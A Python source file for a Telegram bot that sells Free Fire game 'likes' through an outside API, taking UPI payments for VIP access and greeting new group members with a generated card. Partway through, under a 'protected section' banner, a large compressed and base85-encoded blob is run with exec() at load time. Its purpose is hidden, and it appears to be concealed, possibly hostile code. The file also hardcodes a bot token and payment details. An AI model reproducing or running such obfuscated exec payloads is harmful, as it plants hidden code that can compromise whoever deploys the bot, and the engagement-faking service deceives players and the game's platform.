import os
import telebot
import requests
import time
import threading
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import logging
import sys
from io import BytesIO
from PIL import Image, ImageDraw

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# === CONFIG ===
BOT_TOKEN = "8868364202:AAEVRd3NQYm-vxj73TUGuY7MA1a4krmo0yk"

if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN not found!")
    sys.exit(1)

REQUIRED_CHANNELS = ["@hacklinkpc"]
OWNER_ID = 7128817223
OWNER_USERNAME = "@rohit2848"

# Sahi UPI ID & Direct Image Direct Stream URL
UPI_ID = "7605900368@fam"  
QR_CODE_URL = "https://i.ibb.co/3s682Hn/61380.jpg"  

bot = telebot.TeleBot(BOT_TOKEN)
like_tracker = {}   
user_database = set()  

# === DATA RESET ===
def reset_limits():
    while True:
        try:
            now_utc = datetime.utcnow()
            next_reset = (now_utc + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
            sleep_seconds = (next_reset - now_utc).total_seconds()
            time.sleep(sleep_seconds)
            like_tracker.clear()
            logger.info("✅ Daily limits reset at 00:00 UTC.")
        except Exception as e:
            logger.error(f"Error in reset thread: {e}")

threading.Thread(target=reset_limits, daemon=True).start()

# === UTILS ===
def is_user_in_channel(user_id):
    try:
        for channel in REQUIRED_CHANNELS:
            member = bot.get_chat_member(channel, user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                return False
        return True
    except Exception as e:
        return False

def call_api(region, uid):
    url = f"https://freefire-like-and-guest-api-br9t.onrender.com/like?sg={region}&uid={uid}"
    try:
        response = requests.get(url, timeout=20)
        if response.status_code != 200:
            return {"⚠️Invalid": " Maximum likes reached for today."}
        return response.json()
    except Exception:
        return {"error": "API Failed. Try again later."}

def get_user_limit(user_id):
    if user_id == OWNER_ID:
        return 999999999  
    return 1  

# === KEYBOARDS ===
def main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        KeyboardButton("⭐ FREE LIKES"),
        KeyboardButton("💎 BUY VIP / PREMIUM"),
        KeyboardButton("📊 MY PROFILE"),
        KeyboardButton("👥 REFER & EARN"),
        KeyboardButton("👑 OWNER"),
        KeyboardButton("🆘 HELP")
    )
    return markup

def region_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
    markup.add(
        KeyboardButton("IND 🇮🇳"), KeyboardButton("BR 🇧🇷"), KeyboardButton("US 🇺🇸"),
        KeyboardButton("SG 🇸🇬"), KeyboardButton("RU 🇷🇺"), KeyboardButton("ID 🇮🇩"),
        KeyboardButton("🔙 Back")
    )
    return markup

# === COMMANDS & HANDLERS ===
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    user_database.add(user_id)
    
    welcome_text = (
        "✨ **Welcome to VIP Like Services, Leader!**\n\n"
        "🎒 **I'm Free Fire Instant Likes Bot!**\n"
        "⚡ Fast, Safe & 24/7 Active Bot.\n"
        "👇 Tap an option below to get started!"
    )
    bot.send_message(message.chat.id, welcome_text, reply_markup=main_menu(), parse_mode="Markdown")

# === PROFILE BUTTON ===
@bot.message_handler(func=lambda message: message.text == "📊 MY PROFILE")
def profile_click(message):
    user_id = message.from_user.id
    usage = like_tracker.get(user_id, {"used": 0})
    limit = get_user_limit(user_id)
    limit_str = "Unlimited 👑" if limit > 1000 else str(limit)
    
    profile_text = (
        f"👤 **YOUR PROFILE STATS**\n\n"
        f"🆔 **User ID:** `{user_id}`\n"
        f"📊 **Daily Requests Used:** `{usage.get('used', 0)} / {limit_str}`\n"
        f"⚡ **Plan Status:** {'VIP Owner' if user_id == OWNER_ID else 'Free Tier'}\n\n"
        f"💡 *Upgrade to VIP to get Unlimited Daily Likes!*"
    )
    bot.send_message(message.chat.id, profile_text, parse_mode="Markdown")

# === PAYMENT / VIP SYSTEM ===
@bot.message_handler(func=lambda message: message.text == "💎 BUY VIP / PREMIUM")
def buy_vip_click(message):
    text = (
        "💎 **VIP & PREMIUM PLANS**\n\n"
        "🚀 **Benefits:**\n"
        "• Unlimited Daily Likes\n"
        "• Instant API Processing\n"
        "• Priority Support\n\n"
        "💳 **Pricing:**\n"
        "• 1 Day VIP: ₹20\n"
        "• 7 Days VIP: ₹100\n"
        "• Monthly VIP: ₹300\n\n"
        f"📌 **UPI ID:** `{UPI_ID}`\n\n"
        "📸 **How to Pay:**\n"
        "1. Scan the QR code above or copy the UPI ID.\n"
        "2. Make payment and take a screenshot.\n"
        "3. Click below to send proof along with your User ID to Owner!"
    )
    markup = InlineKeyboardMarkup()
    btn = InlineKeyboardButton("📩 Send Proof to Owner", url=f"https://t.me/{OWNER_USERNAME.strip('@')}")
    markup.add(btn)
    
    try:
        img_resp = requests.get(QR_CODE_URL, timeout=10)
        if img_resp.status_code == 200:
            bot.send_photo(message.chat.id, photo=img_resp.content, caption=text, reply_markup=markup, parse_mode="Markdown")
        else:
            bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")
    except Exception:
        bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")

# === FREE LIKES & REGION ===
@bot.message_handler(func=lambda message: message.text == "⭐ FREE LIKES")
def free_likes_click(message):
    text = (
        "💖 **FREE LIKES SECTION**\n\n"
        "🚀 Select your region to claim free likes!"
    )
    bot.send_message(message.chat.id, text, reply_markup=region_menu(), parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text in ["IND 🇮🇳", "BR 🇧🇷", "US 🇺🇸", "SG 🇸🇬", "RU 🇷🇺", "ID 🇮🇩"])
def ask_uid(message):
    region = message.text.split()[0]
    text = f"🌐 **Region:** {region}\n🎯 **Enter your Free Fire UID below:**"
    msg = bot.send_message(message.chat.id, text, parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_user_uid, region)

def process_user_uid(message, region):
    uid = message.text.strip()
    if not uid.isdigit():
        bot.send_message(message.chat.id, "❌ Invalid UID! Numbers only.", reply_markup=main_menu())
        return

    bot.send_message(message.chat.id, f"🔄 **Processing Request...**\n🆔 UID: {uid}\n🌐 Region: {region}")
    threading.Thread(target=process_like, args=(message, region, uid)).start()

def process_like(message, region, uid):
    user_id = message.from_user.id
    now_utc = datetime.utcnow()
    usage = like_tracker.get(user_id, {"used": 0, "last_used": now_utc - timedelta(days=1)})

    if now_utc.date() > usage["last_used"].date():
        usage["used"] = 0

    max_limit = get_user_limit(user_id)
    if usage["used"] >= max_limit:
        bot.reply_to(message, "⚠️ You have exceeded your daily limit! Upgrade to VIP for unlimited requests.")
        return

    processing_msg = bot.reply_to(message, "⏳ Sending likes... Please wait...")
    response = call_api(region, uid)

    if "error" in response:
        bot.edit_message_text(chat_id=processing_msg.chat.id, message_id=processing_msg.message_id, text=f"⚠️ API Error: {response['error']}")
        return

    if not isinstance(response, dict) or response.get("status") != 1:
        bot.edit_message_text(chat_id=processing_msg.chat.id, message_id=processing_msg.message_id, text="❌ Limit reached for this UID today! Try again after 24 hrs.")
        return

    try:
        player_name = response.get("PlayerNickname", "N/A")
        likes_given = str(response.get("LikesGivenByAPI", "N/A"))
        likes_after = str(response.get("LikesafterCommand", "N/A"))

        usage["used"] += 1
        usage["last_used"] = now_utc
        like_tracker[user_id] = usage

        res_text = (
            f"✅ *Request Successful!*\n\n"
            f"👤 *Name:* `{player_name}`\n"
            f"🆔 *UID:* `{uid}`\n"
            f"📈 *Likes Added:* `{likes_given}`\n"
            f"🗿 *Total Likes:* `{likes_after}`\n"
        )
        bot.edit_message_text(chat_id=processing_msg.chat.id, message_id=processing_msg.message_id, text=res_text, parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, "⚠️ Something went wrong processing the request.")

# === BACK BUTTON ===
@bot.message_handler(func=lambda message: message.text == "🔙 Back")
def back_menu(message):
    bot.send_message(message.chat.id, "🔙 Main Menu", reply_markup=main_menu())

# === REFER & OWNER ===
@bot.message_handler(func=lambda message: message.text == "👥 REFER & EARN")
def refer_click(message):
    bot_username = bot.get_me().username
    ref_link = f"https://t.me/{bot_username}?start={message.from_user.id}"
    bot.send_message(message.chat.id, f"👥 **REFERRAL LINK:**\n\n`{ref_link}`\n\nShare this link to earn VIP rewards!", parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "👑 OWNER")
def owner_click(message):
    bot.send_message(message.chat.id, f"👑 **BOT OWNER:** {OWNER_USERNAME}\n🆔 **ID:** `{OWNER_ID}`", parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "🆘 HELP")
def help_click(message):
    bot.send_message(message.chat.id, "📖 Use **⭐ FREE LIKES** button to get instant likes, or buy VIP for unlimited access!", parse_mode="Markdown")

# === BROADCAST COMMAND (OWNER ONLY) ===
@bot.message_handler(commands=['broadcast'])
def broadcast_msg(message):
    if message.from_user.id != OWNER_ID:
        return
    text = message.text.replace("/broadcast", "").strip()
    if not text:
        bot.reply_to(message, "❌ Please provide a message! Usage: `/broadcast Hello Users`", parse_mode="Markdown")
        return
    
    count = 0
    for uid in user_database:
        try:
            bot.send_message(uid, f"📢 **ANNOUNCEMENT:**\n\n{text}", parse_mode="Markdown")
            count += 1
        except Exception:
            pass
    bot.reply_to(message, f"✅ Broadcast sent to {count} users!")

# ╔══════════════════════════════════════════════════════════════════╗
# ║  ⚠️ PROTECTED SECTION - INTEGRITY VERIFIED AT RUNTIME           
# ║  PROTECTED BY TARIKUL ISLAM
# ╚══════════════════════════════════════════════════════════════════╝
import zlib as _qfwmbhsamfxvnt, base64 as __ukihtstkdtcuq
exec(_qfwmbhsamfxvnt.decompress(__ukihtstkdtcuq.b85decode("".join([
    "c-nndS+k-@8hx){aV^CLZ7UQ3u|)wD7u*2_oM;gclvQO>LG-uJ?dqP0sXGyqFBy6ATTY(Lh&+~e",
    "IS0{4>RQ@|8h$93G!BBRliqblyCuJWXliI+$j_~l=cQ((`9^3N>HV8x+DV+8j=mqev8}hi>lH7@",
    "=x;y0G)Bm4<rs}X2^+A==GOukm!4Na9?YBYmBWU+d4JQWL$uQ2G4Z-jU^*INOLOQfh;S$guYPb`",
    "Tas1===;52K^)_jZECl@GcL+x@zek&an5`a2Cp188fyT7yF&WiW4}aVz47jSEGCHj7F~J$ewRsx",
    "ebc13-b(lsXa?{pT5}Oy@KY8K?FTyBAMR!O@Mt%??9wc^vIlkY)d#o4)LAfAN1>iSJo#>NQGy;{",
    ")VmvaU{efqDD{tKvVQC&vBEMw0yj2iPN}mA<M^|1RSpW&WOKZ_J42VJJuS!YYh9xC80SWdB<|Ge",
    "s>=<U%<4TD<`}5kE_IR@JcH5MxHsGZHnhZcRhT3OI)*he+Q>KrNjf)Vf`}-cXK4mufD}JY9bSHk",
    "G%2_ENy_ygGUUs-YC0E+lBI4gLVyh1@pLn|9BR0doSve5KTY0JhIc)$PxgxWMayP7afyzn{@(LZ",
    "g|cVtfPS>*%kiCmy()J628*ElpcCGs*-%VrvY_?(Ym=rH8=I&V5oOFYC!K8h9?WfHTSg-1t`Y!#",
    "rpp-~sS!bvaZ#v8{la1~nRhCk;PmVk+$#YG@6rOb=hjY7Ucs!?<67$^p~0?yYSvFBKxdRBatu=3",
    "8)36kPZ7WSI0GOss>2B`R9j_RzCe?il`lBU`eMrRo3+_ql3jF*<}Pi<svsF4a7PBa=eNgkQmX9;",
    "PkI5idg{M)?S?1B8p-XJUE)NkTC?Pt6}X(@TofwU1sk{Lc#-Q5^fFFV2_SFsXjUrk=7nangi+;p",
    "I%ZvinD)nSoO8jj(_sh4*zFby&tT_1_cK%-)T#1?Y~H)Ib-|p)!}7_P9qF_uCrkL|`Vs-Q88!i2",
    "xnG%2)*Z&LavdvNjsV&7CKRz&AX{xTT2cNrIVu}!!8}_B;9Npa(c>WZ;r4mEEe4voJf9}ikO{5*",
    "r${BbsGr(d#=nT#`Z?Z$r(M#8pGDQ=8R=0VV`{@SAXe{++~u@p-oS9FZqJm2A|w4dt$`A>aZCm&",
    "3qxDZo@-}bw8B&C4YQlb5>scYB5Yac-K*{NxZn62aa37jNUvKg$pyew%^DAPdIS_E3pu4Qglja-",
    "ap2Dr4O)m@NmsNnjn*n`cWXQ1jSyP;m2@QyfknUOz(IFb8HtYqPv5Qqekg^Q-VFR<yPxdkIt7+F",
    "Cu~N0<#1|+Y?*znQLVByo1D<BHvlFY4fVKtH7BgxFO3wQ4(Bvvzy~<(?!k3$`-08H_RObRG@Vke",
    "zI~YwX)tVKSSj~{hgqlL^+&GgHRYDXtF#6-wigo7JDWBd3=0|H^&R-?)!jA&=d!gz;#z>=N3e5E",
    "mqqx@ojYjmT(<eHw3=1>VSfKwKUW8`(`z2~^OZAQnQxqbr1^{Qj{KGaRIjSl&PF75XXDFMzJ=r0",
    "Z6uZMq{Iebicbmfm~q1BQuWM39?N~cI_EkHbBh7hCOT`X2iuKX;bo&m@RPCHn&ca+pcDB`vKX9~",
    "C~SxjZvl&1scM<{Grio!n6LMMK+1BJYFbMedsYu+O;D64psd>Wj<uQPGwj;WZ)Pp;>0TqpO>v2s",
    "%6AM{&87Z5>+h!|Fj}S%hZ}lj#T9DJrP_M7&O2x`MMwe1$iZC>(Yn-Zw>tKKujOc3UKOMFhF^jj",
    "*nB<aBe^&2$0RP{1*km}*u`_9(AqWPxN)6%Rc_JnB%vL<JK$k+QWe5Op%w0hf|r}QNzr+Qpm@rv",
    "^UpuT7@gM&5pKP!QF>(6#+JlZ{P{kb<<0VRKohH)x|D`P4cYC99G6>JsW=sbfg<4wphC9|pyS9S",
    "&1E&La%l+dmsq{|ZG$T25Mp|Cj!2n<r92%~JHXVLV8@P`T-pNJ&^+N$pJiou!F4Jzi}vd0lHW_p",
    "*XD*VUT#7i(51`h)C~7s8GX*rH~e)aiAiO6dco7dZXQ>vRWYlzR<Wav1wmW3iJ?#{>B*iIsWh0~",
    "lEyItj`nmj?oNCCZEK+~@mYb&besx>DlI!N$t=#WxN>L>kNR~qLn3`>)#lG_b|tD5d#T=2D_p}^",
    ")26f`mQH((^^^}4bXb|C+^vY!%98Jh_z}+J(C8qB9p7)>pl%%=YaUwPU}@Epj(GrV7K|YYZmqFB",
    "Z8*Knfi&t}$fP!Ux7@+Qs5f{DVFBb&sLF!o<J^d}<;zDQmHxbL;JweW2d9dr$N+PUVgy9C$N(Fc",
    "zcJzK3Y@JWxLSt_l&jxgpFifiZt~Nuyu5&F20V^WcN_N@c(!QdSRe9>?dr?a`6cBR(zaKa%ohtQ",
    "DXdDxo34<1c9AZYuV+vK%A7msp&0cT#p7p_JFhAW%jy#Tldwb#1Gp8d3$r{IMbGj9YFF=Md7NkS",
    ";*6q)H+EfVtw=hz*H~cX#{=<-UUKQB7*r%si&2`qXHdsu9^_Tp9>n+54>XEQsB*rr1y0=!pKl;N",
    "ST|O>WAOZQd~EI5!hEury#twxFluc#4sd-f3t>^$OSG1s_9&UC7`b_+k}b#GML&m%eVB%<VAJGJ",
    "m(5`^($j4`q2|*&lV9}bxg%d%82dv|s)?!BOgY@<Y-US4m&<A!Tn6*^D?}T+JyZ=ne3sznd6r%U",
    "ToSpuG}KOoTAi-CxM97&e^UbGdh%}P;9y*>d(!?MYQ6qaXwJJx1uZld_2X6W!)V+z<7+}4qj1={",
    "5porbzW?R*blr|)!#^mu^SS-SCjK}W`q{e#Mi_!$Y~l|MNB`PA7~mJf2tnTz_kOa?^x)c$lV`c@",
    "|C9SG_s>+{Ir&lSS;;BBX=+<bA|nL<^@Zra6kXFFhvep|Nvhw^f9}4t{2Bnbh7W#;f&Tn3&%wu+",
    "$Pdf^2vq-QfIm}y?F&JFLO=eY{#zWG75q2oTNEUJeEawu*5966i!C>@{O~9CpT!U3Vd&tO(?Q>i",
    "hi+V=59a4&o&CQHUDPoAW?H`Ly8o2^tH;N|aR1lHf6?|6`1LwIfnPQL8S&qT`UHLz<`ejp=kH%d",
    "`pM~U?tlEv_TOeS70L"
]))).decode('utf-8'))
del _qfwmbhsamfxvnt, __ukihtstkdtcuq

# Dynamic Welcome Card Generator
def generate_welcome_card(user_name, user_id, username, profile_pic_bytes=None):
    width, height = 1000, 500
    img = Image.new("RGB", (width, height), color=(15, 23, 42))
    draw = ImageDraw.Draw(img)

    draw.rectangle([(15, 15), (width - 15, height - 15)], outline=(56, 189, 248), width=3)
    draw.text((60, 50), "WELCOME!", fill=(56, 189, 248))

    draw.text((60, 160), f"Name     : {user_name}", fill=(255, 255, 255))
    draw.text((60, 230), f"ID           : {user_id}", fill=(255, 255, 255))
    draw.text((60, 300), f"Username : @{username}", fill=(255, 255, 255))

    if profile_pic_bytes:
        try:
            pfp = Image.open(BytesIO(profile_pic_bytes)).convert("RGBA")
            pfp_size = (300, 300)
            pfp = pfp.resize(pfp_size)

            mask = Image.new("L", pfp_size, 0)
            mask_draw = ImageDraw.Draw(mask)
            mask_draw.ellipse((0, 0, 300, 300), fill=255)

            pfp_border = Image.new("RGBA", (320, 320), (0, 0, 0, 0))
            border_draw = ImageDraw.Draw(pfp_border)
            border_draw.ellipse((0, 0, 320, 320), outline=(56, 189, 248), width=6)

            img.paste(pfp, (630, 100), mask)
            img.paste(pfp_border, (620, 90), pfp_border)
        except Exception as e:
            print(f"PFP Error: {e}")

    output = BytesIO()
    img.save(output, format="PNG")
    output.seek(0)
    return output

@bot.message_handler(content_types=['new_chat_members'])
def welcome_new_member(message):
    for user in message.new_chat_members:
        u_name = user.first_name or "User"
        u_id = user.id
        u_username = user.username or "None"

        pfp_bytes = None
        try:
            photos = bot.get_user_profile_photos(u_id, limit=1)
            if photos.total_count > 0:
                file_id = photos.photos[0][-1].file_id
                file_info = bot.get_file(file_id)
                file_url = f"https://api.telegram.org/file/bot{bot.token}/{file_info.file_path}"
                pfp_bytes = requests.get(file_url).content
        except Exception as e:
            print(f"Photo error: {e}")

        card_img = generate_welcome_card(u_name, u_id, u_username, pfp_bytes)
        total_members = bot.get_chat_members_count(message.chat.id)

        caption_text = (
            f"❖═══════ WELCOME TO ═══════❖\n"
            f"          **{message.chat.title}**\n\n"
            f"➔ **Name** ❖ {u_name}\n"
            f"➔ **ID** ❖ `{u_id}`\n"
            f"➔ **Username** ❖ @{u_username}\n"
            f"➔ **Total Members** ❖ {total_members}\n"
            f"❖═════════════════════════❖"
        )

        markup = telebot.types.InlineKeyboardMarkup()
        btn1 = telebot.types.InlineKeyboardButton("VIEW NEW MEMBER 👤", url=f"tg://openmessage?user_id={u_id}")
        markup.add(btn1)

        bot.send_photo(
            chat_id=message.chat.id,
            photo=card_img,
            caption=caption_text,
            parse_mode="Markdown",
            reply_markup=markup
        )

# === POLLING START ===
if __name__ == "__main__":
    print("Bot is running in Polling Mode...")
    bot.infinity_polling(skip_pending=True)
    
